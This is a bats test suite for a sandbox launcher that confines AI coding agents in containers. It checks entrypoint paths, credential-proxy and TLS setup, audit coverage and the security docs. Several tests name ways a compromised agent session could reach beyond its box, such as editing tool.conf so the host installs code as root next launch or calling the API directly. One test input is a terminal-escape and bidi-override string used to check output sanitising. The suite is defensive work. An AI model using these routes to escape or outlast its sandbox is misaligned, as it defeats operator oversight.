    # simply been deleted along with them.
    grep -qE '^RUN mkdir -p \$SANDBOX_HOME/\.ssh' "$d"
}

@test "nothing shared names one harness as the command to run" {
    # A default here decides for every harness, and names a binary an image
    # built for a different one does not contain.
    run grep -nE 'SANDBOX_CMD:-[a-z]' "$SANDBOX_DIR/entrypoint.sh" "$SANDBOX_DIR/docker-compose.yml"
    [ "$status" -ne 0 ] || { echo "a harness is the default command:"; echo "$output"; return 1; }
    # Refused rather than defaulted, so an unset one says why.
    grep -q 'SANDBOX_CMD is unset' "$SANDBOX_DIR/entrypoint.sh"
}

@test "the compose service and its shared volumes are named for dejima, not a harness" {
    local y="$SANDBOX_DIR/docker-compose.yml"
    run grep -nE '^\s{2}claude:|claude-code-[a-z]+:' "$y"
    [ "$status" -ne 0 ] || { echo "a harness names the service or a volume:"; echo "$output"; return 1; }
    grep -qE '^  sandbox:' "$y"
    # And EVERY compose invocation in bin/dejima names that same service, with
    # at least one build and one run. Counted by shape rather than pinned to a
    # number: the count changed the moment a second run appeared for the
    # no-terminal case, which says nothing about whether the naming is right.
    local line builds=0 runs=0
    while IFS= read -r line; do
        case "$line" in
            *" sandbox "*|*" sandbox") ;;
            *) echo "a compose invocation that does not name the service: $line"; return 1 ;;
        esac
        case "$line" in
            *"compose -f \"\$COMPOSE_FILE\" build"*) builds=$((builds + 1)) ;;
            *"compose -f \"\$COMPOSE_FILE\" run"*) runs=$((runs + 1)) ;;
        esac
    done < <(grep 'compose -f "$COMPOSE_FILE" \(build\|run\)' "$REPO_ROOT/bin/dejima")
    [ "$builds" -ge 1 ] || { echo "no compose build names the service"; return 1; }
    [ "$runs" -ge 1 ] || { echo "no compose run names the service"; return 1; }
}

@test "the TLS terminator answers for the backend's declared domain, not a literal" {
    # The backend manifest declares proxied_domain; the entrypoint used the
    # name of one API in the cert, the SAN and the /etc/hosts pin.
    local e="$SANDBOX_DIR/entrypoint.sh"
    run grep -nE '(CN=|DNS:|127\.0\.0\.1 )api\.anthropic\.com' "$e"
    [ "$status" -ne 0 ] || { echo "the terminator is pinned to one harness's API:"; echo "$output"; return 1; }
    grep -q 'SANDBOX_BACKEND_PROXIED_DOMAIN' "$e" \
        || { echo "the entrypoint does not read the declared domain"; return 1; }
    # And a proxy socket with no domain declared for it is refused, rather
    # than bringing up a terminator that intercepts nothing.
    grep -q 'declares no proxied_domain' "$e" \
        || { echo "an empty proxied domain is not refused"; return 1; }
}

@test "a harness's image needs are declared in its manifest" {
    local m="$REPO_ROOT/harnesses/claude-code/harness.conf"
    grep -qE '^image_dirs\s*=.*\.claude' "$m" || { echo "no image_dirs declared"; return 1; }
    grep -qE '^image_env\s*=.*CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC' "$m" \
        || { echo "no image_env declared"; return 1; }
}

# entrypoint.sh runs in every container this repo builds, including the base
# image on its own - runtime.bats boots exactly that, with no harness layer
# above it. So a path only one harness has is not merely a coupling here, it
# is a container that aborts during startup on any image whose harness never
# declared the directory that path lives in. That is what happened: the
# credential seeding outlived the ~/.claude the base image used to create.
#
# Only the privileged tier caught it, because only that tier boots a
# container. This is the same check without a Docker daemon.
@test "the shared entrypoint names no harness's paths" {
    local e="$SANDBOX_DIR/entrypoint.sh"
    run grep -nE '^[^#]*(\$SANDBOX_HOME|\$HOME|~)/\.(claude|aider|opencode)' "$e"
    [ "$status" -ne 0 ] || {
        echo "entrypoint.sh reaches into one harness's home directory:" >&2
        echo "$output" >&2
        echo "It runs in every image, including the base one on its own." >&2
        return 1
    }
}

@test "a file a harness needs seeded is declared, not created by shared code" {
    # An absent file and an empty one are not reliably the same to a harness
    # that reads a credential from a fixed path, so something has to be
    # there - declared by the harness that needs it, created in its own
    # layer, and shadowed by whatever the transport mounts over it.
    local m="$REPO_ROOT/harnesses/claude-code/harness.conf"
    grep -qE '^image_files\s*=.*\.credentials\.json' "$m" \
        || { echo "the credential file is not declared"; return 1; }
    run bash -c 'source "$1"; generate_spec_dockerfile base "" "" "" ".claude/.credentials.json"' _ \
        "$REPO_ROOT/bin/dejima-project-lib.sh"
    [ "$status" -eq 0 ] || { echo "$output"; return 1; }
    # Empty and 0600: it stands in for a credential, so it must not be
    # readable by anything but the session's own user.
    [[ "$output" == *'install -o ${SANDBOX_USER} -g ${SANDBOX_USER} -m 600 /dev/null'* ]] \
        || { echo "$output"; return 1; }
}

# The confined tier cannot boot a container, so it cannot see a container
# aborting at startup. It CAN see the cross-file invariant behind one, which
# is what this is: entrypoint.sh runs in the base image with nothing above it,
# so every literal path it writes under the sandbox user's home has to be
# created by the Dockerfile, or by the entrypoint itself before use.
#
# The credential seeding was neither. It wrote into a ~/.claude the Dockerfile
# used to create, that moved to the harness's own layer, and every container
# on an image whose harness had not declared it then died in startup. Only the
# privileged tier caught it, hours later; this is the same question asked of
# the files instead of a running container.
@test "every home path the entrypoint writes is created by the image or by itself" {
    local e="$SANDBOX_DIR/entrypoint.sh" d="$SANDBOX_DIR/Dockerfile"
    local p top missing="" checked=0
    while IFS= read -r p; do
        [ -n "$p" ] || continue
        top="${p%%/*}"
        checked=$((checked + 1))
        # Created in the base image.
        grep -qE "mkdir -p .*\\\$SANDBOX_HOME/$top" "$d" && continue
        missing="$missing $top"
    done < <(grep -oP '(?<=\$SANDBOX_HOME/)[A-Za-z0-9._][A-Za-z0-9._/-]*' "$e" | sort -u)
    [ "$checked" -gt 0 ] \
        || { echo "no literal home paths found - has the extraction stopped working?"; return 1; }
    [ -z "$missing" ] || {
        echo "entrypoint.sh writes under home directories nothing creates:$missing" >&2
        echo "It runs in the base image alone, so a directory a harness layer" >&2
        echo "adds is not there. Create it in the Dockerfile, or declare it" >&2
        echo "and write the file from the harness's own layer." >&2
        return 1
    }
}

# runtime.bats is the only suite that boots containers, so its fixtures are
# the only place a container-shaped mistake can hide until the privileged
# tier runs - twenty minutes and a queue behind every other job. These three
# ask the questions that tier answered the hard way.
@test "runtime.bats names every container after the run, not the file index" {
    # basename "$BATS_FILE_TMPDIR" is the file's index within the run, which
    # is "0" for the only file there - so a name built from it is the same in
    # every run. `docker run` refuses a name in use, so one leftover from a
    # failed run fails every run afterwards until someone clears it by hand.
    # That is exactly what happened, to a container the earlier fix did not
    # cover: it changed the two helpers and left twenty per-test names alone.
    local rt="$REPO_ROOT/test/runtime.bats"
    run grep -nE 'dejima-test-[a-z-]*\$?\(?basename "\$BATS_FILE_TMPDIR"' "$rt"
    [ "$status" -ne 0 ] || {
        echo "a container or image name is keyed on the file index:" >&2
        echo "$output" >&2
        return 1
    }
    grep -q '^test_container_name() {' "$rt" \
        || { echo "there is no one place per-test names come from"; return 1; }
}

@test "runtime.bats removes what it made by deriving it, not by listing it" {
    # The teardown enumerated twenty names by hand and had to be kept in step
    # with twenty test bodies. It silently stopped matching all of them the
    # moment the names changed, which is a leak that fills a runner and then
    # fails the next run on a conflict.
    local rt="$REPO_ROOT/test/runtime.bats"
    # The per-test teardown, which is where the twenty-name list lived.
    local body
    body="$(sed -n '/^teardown() {/,/^}/p' "$rt")"
    [ -n "$body" ] || { echo "no teardown"; return 1; }
    grep -q 'docker ps -a --filter' <<< "$body" \
        || { echo "teardown does not derive the containers it removes"; return 1; }
    local listed
    listed=$(grep -c 'dejima-test-[a-z-]\+-\$' <<< "$body" || true)
    [ "$listed" -eq 0 ] \
        || { echo "teardown still names $listed containers by hand"; return 1; }
    # It runs after every test and the file-wide container has to survive all
    # of them, so the sweep must exclude it explicitly rather than by luck.
    grep -q 'keep="$(container_name)"' <<< "$body" \
        || { echo "the per-test sweep would remove the file-wide container"; return 1; }
}

@test "every runtime.bats container that mounts a proxy socket declares the domain" {
    # entrypoint.sh refuses a credential proxy with no proxied_api_domain,
    # because a terminator answering for nothing would let the session reach
    # the real API directly. A fixture that mounts the socket without the
    # domain is not testing the proxy, it is testing that refusal - which is
    # how two of these failed.
    local rt="$REPO_ROOT/test/runtime.bats" sock dom
    sock=$(grep -c 'SANDBOX_CREDENTIAL_PROXY_SOCKET=.*proxy\.sock' "$rt")
    dom=$(grep -c 'SANDBOX_BACKEND_PROXIED_DOMAIN=' "$rt")
    [ "$sock" -gt 0 ] || { echo "no proxy fixtures found - has this moved?"; return 1; }
    # One of the domain lines is the file-wide fixture, which mounts no
    # socket, so the domains must outnumber the sockets that go through a
    # container. The one socket that does not is the host-side forwarder,
    # which never reaches entrypoint.sh.
    [ "$dom" -ge "$sock" ] || {
        echo "$sock proxy sockets but only $dom declared domains - a container" >&2
        echo "mounting the socket without the domain is refused at startup." >&2
        return 1
    }
}

# bats runs setup_file in one process and every test in another, and does not
# carry a plain assignment from the first into the second. So a fixture
# variable is set in setup_file and EMPTY everywhere a test can reach - which
# is not an error, just a wrong answer, and the wrong answer here was an empty
# proxied domain that made two containers refuse to start.
#
# The rule that avoids it: anything a test body can reach derives its own
# paths from BATS_TEST_DIRNAME, which bats exports. setup_file's variables
# stay inside setup_file.
@test "runtime.bats' fixture variables do not escape setup_file" {
    local rt="$REPO_ROOT/test/runtime.bats" v outside start end
    # setup_file's line range, so "inside" is decided by position rather than
    # by matching its text - a body with a blank line in it makes any
    # fixed-string filter match every line in the file.
    start=$(grep -n '^setup_file() {' "$rt" | cut -d: -f1)
    [ -n "$start" ] || { echo "no setup_file"; return 1; }
    end=$(awk -v s="$start" 'NR > s && /^}/ { print NR; exit }' "$rt")
    [ -n "$end" ] || { echo "setup_file has no end"; return 1; }
    for v in SANDBOX_DIR REPO_ROOT; do
        sed -n "${start},${end}p" "$rt" | grep -q "$v=" || continue
        # Every use of it outside that range, comments aside.
        outside=$(grep -n "\$$v" "$rt" \
            | grep -v '^[0-9]*:[[:space:]]*#' \
            | awk -F: -v s="$start" -v e="$end" '$1 < s || $1 > e' || true)
        [ -z "$outside" ] || {
            echo "\$$v is assigned in setup_file and used outside it:" >&2
            echo "$outside" >&2
            echo "A test body reaching that gets an empty string, not an error." >&2
            return 1
        }
    done
}

@test "runtime.bats fails loudly when the harness layer cannot be built" {
    # `export VAR="$(cmd)"` returns the export's status, so a failed build
    # leaves the tag empty, the default at the top of the file substitutes the
    # base image, and the suite tests an image no session runs while blaming
    # whichever assertions happen to depend on the harness's directories.
    local rt="$REPO_ROOT/test/runtime.bats"
    run grep -n 'export SESSION_IMAGE="\$(build_harness_layer' "$rt"
    [ "$status" -ne 0 ] || {
        echo "the layer build's failure is masked by export:" >&2; echo "$output" >&2; return 1; }
    grep -q 'session_image="$(build_harness_layer "$IMAGE")" ||' "$rt" \
        || { echo "the layer build's status is not checked"; return 1; }
}

@test "the update check is wired into a launch, not only shipped" {
    # A tool nothing calls is a tool that works in its own tests and never
    # runs. The startup path is the only thing that makes this a check rather
    # than a command nobody knows about.
    grep -q 'dejima-update-check' "$REPO_ROOT/bin/dejima" \
        || { echo "bin/dejima never runs the update check"; return 1; }
    # Advisory: a version check that fails must not take a launch with it.
    grep -q 'dejima-update-check" || true' "$REPO_ROOT/bin/dejima" \
        || { echo "a failed update check would stop the launch"; return 1; }
    grep -q 'link_bin dejima-update-check' "$REPO_ROOT/install.sh" \
        || { echo "it is not on PATH, so it cannot be run by hand"; return 1; }
}

@test "the docs disclose that dejima itself reaches the network from the host" {
    # dejima's whole argument is about what leaves and through which control.
    # A request it makes on its own account, at every startup, is the one an
    # operator is least expecting and most entitled to know about.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/security.md" | tr -d '*`' | tr -s ' ')"
    grep -qi 'the one request dejima itself makes' <<< "$flat" \
        || { echo "the host-side request is undisclosed"; return 1; }
    grep -qi 'no other endpoint and no telemetry' <<< "$flat" \
        || { echo "the scope of the request is unstated"; return 1; }
    grep -q '\[core\] update_check = off' <<< "$flat" \
        || { echo "the docs do not say how to turn it off"; return 1; }
    # And why it is reached by URL. Without the reason, a later tidy-up reads
    # the indirection as pointless and removes it.
    grep -qi 'never by remote name' <<< "$flat" \
        || { echo "the reason for the URL is gone"; return 1; }
}

@test "the epitaph renderer strips exactly what the shared sanitize() does" {
    # `list` is a python renderer that parses the header fields itself, so
    # there is nothing to hand it a string the shell already cleaned - the
    # rule ends up written twice. This keeps the second copy honest, and it
    # reads the real definition out of the script rather than restating it,
    # so a change there is a change here.
    local py_clean nasty out_sh out_py
    py_clean="$(sed -n '/^_BAD = re.compile(/,/^    return _BAD.sub/p' \
        "$REPO_ROOT/bin/dejima-epitaph")"
    [ -n "$py_clean" ] || { echo "the renderer's clean() is not where this looks"; return 1; }
    # One of each class the comment in dejima-color-lib.sh names: C0, BEL, a
    # C1 control, a bidi override, a bidi isolate, DEL. No NUL - it cannot
    # survive argv, and neither implementation is reached that way.
    nasty="$(python3 -c 'import sys
sys.stdout.write("a\u001b[2Jb\u0007c\u009bd\u202ee\u2066f\u007fg")')"
    out_sh="$(bash -c 'source "$1"; sanitize "$2"' _ \
        "$REPO_ROOT/bin/dejima-color-lib.sh" "$nasty")"
    out_py="$(python3 -c "
import re, sys
$py_clean
sys.stdout.write(clean(sys.argv[1]))" "$nasty")"
    [ "$out_sh" = "$out_py" ] \
        || { printf 'shell: %q\npython: %q\n' "$out_sh" "$out_py"; return 1; }
    # And both actually removed something, so agreeing on "no change" cannot
    # pass this.
    [ "$out_sh" != "$nasty" ] || { echo "neither stripped anything"; return 1; }
}

@test "the docs say why only one notification event is registered" {
    # A dropped notification looks like a bug from the phone, so the reason
    # has to be readable without going to the plugin - and without it, the
    # obvious "fix" is to register Notification again and put the second push
    # back.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/remote-access.md" | tr -d '*`' | tr -s ' ')"
    grep -qi 'One push per stop, and not a second one a minute later' <<< "$flat" \
        || { echo "the single-event choice is unexplained"; return 1; }
    grep -qi 'runs with permission prompts off' <<< "$flat" \
        || { echo "why Notification has only a timer left is unstated"; return 1; }
    # And what it costs, which is the half a reader is owed before deciding
    # the trade was made for them correctly.
    grep -qi 'gone idle without having stopped' <<< "$flat" \
        || { echo "the docs do not say what is given up"; return 1; }
}

@test "the README's docs index names every doc a reader is meant to find" {
    # tools.md shipped and the index did not gain a row, so the only new
    # reader-facing document of that release was reachable only by knowing it
    # existed. Derived from the directory rather than from a list here, which
    # is what makes it catch the next one.
    local f name missing=""
    for f in "$REPO_ROOT"/docs/*.md; do
        name="$(basename "$f")"
        # release.md is the maintainer's process, deliberately not offered to
        # a reader arriving at the README.
        [ "$name" = "release.md" ] && continue
        grep -q "(docs/$name)" "$REPO_ROOT/README.md" \
            || missing="$missing $name"
    done
    [ -z "$missing" ] || { echo "shipped but not in the README index:$missing"; return 1; }
}

@test "the docs do not count the capabilities the container is granted" {
    # The count said seven and compose granted eight. A number in prose that
    # has to match a list in a file is a number that goes wrong quietly, and
    # the repo's own rule is not to write one - so the doc names the split and
    # points at the file that holds the list.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/security.md" | tr -d '*`' | tr -s ' ')"
    grep -qiE 'cap_drop: ALL plus the (two|three|four|five|six|seven|eight|nine|ten) ' <<< "$flat" \
        && { echo "the capability floor is described by counting again"; return 1; }
    grep -q 'docker/docker-compose.yml' <<< "$flat" \
        || { echo "the doc does not say where the real list is"; return 1; }
    return 0
}

@test "the README says every shipped workflow blocks merges, because they all do" {
    # Derived from the manifests: the claim and the thing it describes move
    # together, so a workflow shipped with block_merge off fails this rather
    # than leaving the README quietly wrong.
    local d name off=""
    for d in "$REPO_ROOT"/workflows/*/; do
        [ -d "$d" ] || continue
        name="$(basename "$d")"
        [ "$(lib manifest_get workflow "$name" block_merge)" = "on" ] || off="$off $name"
    done
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/README.md" | tr -d '*`' | tr -s ' ')"
    if [ -z "$off" ]; then
        grep -qi 'every workflow dejima ships turns it on' <<< "$flat" \
            || { echo "all of them block merges and the README does not say so"; return 1; }
    else
        grep -qi 'every workflow dejima ships turns it on' <<< "$flat" \
            && { echo "the README claims all of them, but these do not:$off"; return 1; }
    fi
    return 0
}

@test "identity_get decides a key is not an identity's before resolving one" {
    # bin/dejima's config_get wrapper calls identity_get on every read, and
    # all but a handful of keys are ones no identity can answer for. With the
    # resolution first, a --print-config went from 2.4s to 41s: it walked
    # every forge manifest per key to find out the key was core.harness.
    #
    # Asserted by order rather than by timing, which would be a flaky test
    # about the machine it runs on.
    local body guard resolve
    body="$(sed -n '/^identity_get() {/,/^}/p' "$REPO_ROOT/bin/dejima-provider-lib.sh")"
    [ -n "$body" ] || { echo "identity_get is not where this looks"; return 1; }
    guard="$(grep -n 'core)' <<< "$body" | head -1 | cut -d: -f1)"
    resolve="$(grep -n 'identity_selected_into' <<< "$body" | head -1 | cut -d: -f1)"
    [ -n "$guard" ] && [ -n "$resolve" ] \
        || { echo "the guard or the resolution moved out of identity_get"; return 1; }
    [ "$guard" -lt "$resolve" ] \
        || { echo "the identity is resolved before the key is known to need one"; return 1; }
}

@test "the docs say a suspended job is not a paused session" {
    # Ctrl-Z stops bin/dejima on the host; the container keeps running with
    # its grants. A stopped job reads as a paused agent, and the person most
    # likely to be misled is the one who suspended it because they were uneasy
    # about what it was doing.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/security.md" | tr -d '*`' | tr -s ' ')"
    grep -qi 'Ctrl-Z stops the observer, not the session' <<< "$flat" \
        || { echo "the suspend caveat is not in the negative-space list"; return 1; }
    grep -qi 'keeps making requests' <<< "$flat" \
        || { echo "it does not say the session keeps running"; return 1; }
}

@test "the self-hosting caveat names every manifest a session can aim at the next launch" {
    # forge.conf was named and tool.conf was not, though the host reads both
    # and the image build installs what tool.conf points at, as root.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/security.md" | tr -d '*`' | tr -s ' ')"
    # tool.conf, not tools/*/tool.conf: the normalisation strips the emphasis
    # markers and takes the glob's asterisk with them.
    grep -q 'tool.conf' <<< "$flat" \
        || { echo "tool.conf is not named as session-writable input"; return 1; }
    grep -qi 'downloads and installs as root' <<< "$flat" \
        || { echo "what a tool.conf edit buys is unstated"; return 1; }
}

@test "the audit watches every directory whose contents decide the next launch" {
    # docs/security.md says the provider directories are in the TCB list
    # "for that reason", and tools/ was added to that claim without being
    # added to the list - a tool.conf names a tarball and the sha256 checked
    # against it, and the host's image build installs what it points at as
    # root. Derived from what is on disk rather than from a list here, so the
    # next axis is covered the day it lands.
    local line dir missing=""
    line="$(grep -n 'for dir in bin hooks' "$REPO_ROOT/bin/dejima-audit" | head -1)"
    [ -n "$line" ] || { echo "the audit's TCB directory list is not where this looks"; return 1; }
    for dir in "$REPO_ROOT"/*/; do
        dir="$(basename "$dir")"
        # The directories that hold provider or tool manifests, which is what
        # this claim is about. Others are covered by their own entries.
        case "$dir" in forges|workflows|harnesses|tools) ;; *) continue ;; esac
        [ -n "$(find "$REPO_ROOT/$dir" -name '*.conf' -print -quit 2>/dev/null)" ] || continue
        grep -qE "(^| )$dir( |;)" <<< "$line" || missing="$missing $dir"
    done
    [ -z "$missing" ] \
        || { echo "ships manifests the exit audit does not watch:$missing"; return 1; }
}

@test "the self-hosting caveat says it needs dejima's own checkout to be the workspace" {
    # Nothing mounts the provider directories into a container, so for every
    # launch pointed at another project a session cannot reach these paths at
    # all. Without that stated, the section reads as an exposure every user
    # has, when it belongs to the one configuration almost nobody runs.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/security.md" | tr -d '*`' | tr -s ' ')"
    grep -qi "requires dejima's own checkout to be the workspace" <<< "$flat" \
        || { echo "the precondition is not stated where the consequences are"; return 1; }
    grep -qi 'the resolved values go in, the files do not' <<< "$flat" \
        || { echo "it does not say why another project's session cannot reach them"; return 1; }
}

@test "the self-hosting warning names what the audit actually watches" {
    # The warning listed bin/, hooks/, docker/ and install.sh; the audit
    # watches those plus test/ and every manifest directory. A warning that
    # under-names the writable surface is one an operator reads as complete.
    local warn
    warn="$(sed -n '/own repo is the mounted workspace/,/^fi$/p' "$REPO_ROOT/bin/dejima")"
    [ -n "$warn" ] || { echo "the self-hosting warning has moved"; return 1; }
    grep -q 'test/' <<< "$warn" || { echo "the warning omits test/"; return 1; }
    grep -qi 'manifest' <<< "$warn" \
        || { echo "the warning omits the provider and tool manifests"; return 1; }
}

@test "the tty-suspend fixture refuses to run without a work directory of its own" {
    # It used to fall back to /tmp, and then wrote and executed three fixed
    # names there. Every caller passes a directory, so nothing shipped took
    # that branch - but this fixture runs on CI hosts, and a predictable
    # executed path is worth not leaving for the caller that forgets (#249).
    run env -u TTY_SUSPEND_WORK python3 \
        "$REPO_ROOT/test/fixtures/tty-suspend-harness.py" /bin/true
    [ "$status" -ne 0 ] || { echo "it ran with no work directory: $output"; return 1; }
    [[ "$output" == *TTY_SUSPEND_WORK* ]] || { echo "$output"; return 1; }
    # Deliberately no assertion about /tmp itself. The first version checked
    # that /tmp/launcher.sh and /tmp/container.py did not exist, and failed -
    # because the mutation-check for this very test had run the old fixture
    # without the variable minutes earlier and left them there. An assertion
    # about a shared directory reads whatever else has touched it. The refusal
    # happens where WORK is assigned, before any path is built from it, which
    # is what the status and the message above establish.
}

@test "the tty-suspend fixture pins the locale its job-control check reads" {
    # `expect("Stopped")` reads the shell's own job-control notice, which is
    # translated. Inherited, the assertion fails on a non-English runner with
    # nothing about the terminal handling having changed - the environment-
    # reading pattern .dejima.md records as having shipped twice already.
    grep -q 'LC_ALL="C"' "$REPO_ROOT/test/fixtures/tty-suspend-harness.py" \
        || { echo "the child shell's locale is inherited again"; return 1; }
}

# $output with SGR removed. The banner colours its labels, so a reset escape
# sits between "harness" and its value - and an assertion on the two as one
# string then matches nothing whether the banner drew or not. That is how the
# first version of the off-switch test passed against a build with the switch
# removed.
_plain_output() { printf '%s' "$output" | sed 's/\x1b\[[0-9;]*m//g'; }

@test "the startup banner says what this launch is" {
    # The startup output was a list of checks with no point at which it said
    # what it is, and the facts that differ between one launch and the next
    # were ones an operator had to remember or go and read (#211).
    startup_warning_setup
    run startup_warning_launch_tty ''
    [[ "$output" == *dejima* ]] || { echo "$output"; return 1; }
    # The selection, each labelled, because "gitea" on its own does not say
    # which of the three axes it is.
    local field
    for field in harness forge workflow firewall remote epitaph; do
        [[ "$output" == *"$field"* ]] \
            || { echo "the banner does not name $field: $output"; return 1; }
    done
    # And the values, not just the labels.
    [[ "$(_plain_output)" == *"harness claude-code"* ]] \
        && [[ "$(_plain_output)" == *"workflow local-only"* ]] \
        || { echo "the banner names no values: $output"; return 1; }
    rm -rf "$DEJIMA_T"
}

@test "the startup banner is off when the config says so" {
    # A banner is exactly the thing that gets in the way when you launch
    # dejima forty times in an afternoon, so it has a switch.
    startup_warning_setup
    printf '[ui]\nbanner = off\n' >> "$DEJIMA_T/config/config"
    run startup_warning_launch_tty ''
    [[ "$(_plain_output)" != *"harness claude-code"* ]] \
        || { echo "banner = off still drew it: $output"; return 1; }
    # The rest of the startup output is untouched - this suppresses the
    # banner, not the checks.
    [[ "$output" == *"is starting"* ]] \
        || { echo "it suppressed more than the banner: $output"; return 1; }
    rm -rf "$DEJIMA_T"
}

@test "the startup banner draws nothing into a redirected launch" {
    # A launch with output redirected is a log, and this is decoration in it.
    # `run` gives no terminal, which is the same shape as a pipe or cron.
    startup_warning_setup
    run env HOME="$DEJIMA_T/home" PATH="$DEJIMA_T:$PATH" \
        DEJIMA_CONFIG_DIR="$DEJIMA_T/config" \
        SANDBOX_TEST_DOCKER_LOG="$DEJIMA_T/docker-log" \
        SSH_AUTH_SOCK= ALLOWED_DOMAINS= \
        "$REPO_ROOT/bin/dejima" "$DEJIMA_T/ws"
    [[ "$(_plain_output)" != *"harness claude-code"* ]] \
        || { echo "a redirected launch got a banner: $output"; return 1; }
    rm -rf "$DEJIMA_T"
}

@test "the banner says so when the firewall is off" {
    # The one switch here that is a boundary rather than a choice, so it is
    # the one that gets a colour of its own.
    startup_warning_setup
    printf '[core]\nfirewall = off\n' >> "$DEJIMA_T/config/config"
    run startup_warning_launch_tty ''
    [[ "$(_plain_output)" == *"firewall off"* ]] \
        || { echo "the banner does not report the firewall being off: $output"; return 1; }
    rm -rf "$DEJIMA_T"
}

@test "the wordmark is one colour, wherever dejima writes it" {
    # The launch banner and the two pickers all print "dejima". They used to
    # reach for whatever was nearest - bold cyan in one, the badge colour in
    # the others - which is the drift a shared palette exists to stop.
    # Code, not comments. The first version of this grepped the whole file
    # and passed against a build where the banner had been changed back,
    # because the comment above the line still said "C_BADGE".
    local f
    for f in bin/dejima bin/dejima-tui-lib.sh; do
        grep -v '^[[:space:]]*#' "$REPO_ROOT/$f" | grep -q 'C_BADGE' \
            || { echo "$f writes the wordmark in some other colour"; return 1; }
    done
    # And it is defined once.
    run grep -c '^\s*C_BADGE=' "$REPO_ROOT/bin/dejima-color-lib.sh"
    [ "$output" -eq 1 ] || { echo "C_BADGE is defined $output times"; return 1; }
}

@test "the web terminal is given a palette, since the browser has none to inherit" {
    # dejima's output reaches a terminal in indexed colour so the terminal's
    # own theme fills the slots. On the web front door dejima IS the terminal:
    # xterm.js has no gruvbox to inherit, so without a theme the front door
    # showed its stock palette - white on black, bright red, magenta - while
    # the same session over SSH showed the operator's.
    local ttyd="$REPO_ROOT/bin/dejima-ttyd"
    grep -q "theme=" "$ttyd" || { echo "ttyd is given no theme"; return 1; }
    # Every ANSI slot, not just the accents: a missing one falls back to
    # xterm.js's default for that slot alone, which is harder to notice than
    # no theme at all.
    local slot
    for slot in black red green yellow blue magenta cyan white \
                brightBlack brightRed brightGreen brightYellow \
                brightBlue brightMagenta brightCyan brightWhite \
                background foreground cursor; do
        grep -q "\"$slot\":" "$ttyd" \
            || { echo "the web terminal theme has no $slot"; return 1; }
    done
}

@test "the two surfaces dejima owns agree on the gruvbox values they share" {
    # page.css and the ttyd theme are the two places dejima sets both sides of
    # the contrast, so both carry exact hexes - and two copies of a palette is
    # how one drifts. Only the values they actually share are compared; the
    # page carries chrome colours the terminal has no slot for, and the
    # terminal carries eleven slots the page never draws.
    local css="$REPO_ROOT/web/src/page.css" ttyd="$REPO_ROOT/bin/dejima-ttyd"
    local -A shared=(
        [--gb-dark0]=background  [--gb-light1]=foreground
        [--gb-yellow]=brightYellow [--gb-green]=brightGreen
        [--gb-blue]=brightBlue   [--gb-dark2]=selectionBackground
    )
    local var slot hex_css hex_ttyd checked=0
    for var in "${!shared[@]}"; do
        slot="${shared[$var]}"
        hex_css="$(sed -n "s/^  $var: *\(#[0-9a-fA-F]\{6\}\).*/\1/p" "$css" | head -1)"
        hex_ttyd="$(sed -n "s/.*\"$slot\":\"\(#[0-9a-fA-F]\{6\}\)\".*/\1/p" "$ttyd" | head -1)"
        [ -n "$hex_css" ] && [ -n "$hex_ttyd" ] || continue
        checked=$((checked + 1))
        [ "${hex_css,,}" = "${hex_ttyd,,}" ] \
            || { echo "$var is $hex_css in the page and $slot is $hex_ttyd in the terminal"; return 1; }
    done
    [ "$checked" -ge 4 ] \
        || { echo "only $checked shared values were compared"; return 1; }
}

@test "the front door's auth requirement is stated as a requirement, not as one product" {
    # docs/remote-access.md documented HTTP Basic and nothing else, so anyone
    # whose threat model pointed elsewhere read a document that appeared to
    # have no answer. What the doc owes is the requirement; the software that
    # meets it is the reader's (#212). Pinned as the requirement rather than
    # by naming any of the options, so replacing one does not fail this.
    local flat
    flat="$(tr '\n' ' ' < "$REPO_ROOT/docs/remote-access.md" | tr -d '*`' | tr -s ' ')"
    grep -qi 'every request to every server block, the default one included' <<< "$flat" \
        || { echo "the requirement is not stated"; return 1; }
    grep -qi 'not that it is any particular software' <<< "$flat" \
        || { echo "it still reads as one product being the answer"; return 1; }

    # The bind address survives as the thing none of the options replaces -
    # the strongest part of the document, and the one a list of auth options
    # invites a reader to think they have dealt with.
    grep -qi 'does not replace' <<< "$flat" \
        || { echo "an option is allowed to stand in for the bind address"; return 1; }

    # And the property that holds whichever is chosen, which used to sit
    # attached to Basic alone.
    grep -qi 'stops a browser that has already authenticated' <<< "$flat" \
        || { echo "the already-authenticated browser is undisclosed"; return 1; }

    # Costed rather than recommended by silence: a solo operator reading this
    # should be told Basic is a trade, not that it is the answer.
    grep -qi 'no per-operator identity' <<< "$flat" \
        || { echo "what Basic costs is unstated"; return 1; }
}

@test "the four credential arrangements are documented with what each exposes" {
    # There is more than one kind of provider now, and they differ in exactly
    # one way that matters: three keep the credential on the host and one
    # mounts it. A reader choosing a provider needs that comparison in one
    # place rather than assembled from a section written when Anthropic OAuth
    # was the only path (#171).
    local sec="$REPO_ROOT/docs/security.md" flat
    flat="$(flat_prose "$sec")"
    grep -q '^| Arrangement | In the container | What a compromised session can take |' "$sec" \
        || { echo "the arrangement table is gone or lost a column"; return 1; }
    local rows
    rows="$(sed -n '/^| Arrangement | In the container |/,/^$/p' "$sec")"
    local arrangement
    for arrangement in 'anthropic-oauth' 'credential = static' 'credential = none' 'No proxy'; do
        grep -qF "$arrangement" <<< "$rows" \
            || { echo "no row for: $arrangement"; return 1; }
    done
    # The one that differs, said outright rather than left to the table.
    grep -qi 'first three keep the credential out; the fourth does not' <<< "$flat" \
        || { echo "nothing says which arrangement mounts the credential"; return 1; }
    # The residual the proxied ones share. A page that only lists what is
    # prevented reads as a stronger claim than the code makes.
    grep -qi 'residual the first two share is use-while-running' <<< "$flat" \
        || { echo "the use-while-running residual is undocumented"; return 1; }
    # Refreshing vs static, which is about the HOST-side value rather than
    # about what the container sees.
    grep -qi 'differ in what a leak elsewhere costs, not in what the' <<< "$flat" \
        || { echo "oauth and static read as equivalent"; return 1; }
    # And the firewall asymmetry, with its limit attached. Without the limit
    # this reads as a route block, which it is not.
    grep -qi 'not in the egress allowlist while the proxy is on' <<< "$flat" \
        || { echo "the allowlist asymmetry is undocumented"; return 1; }
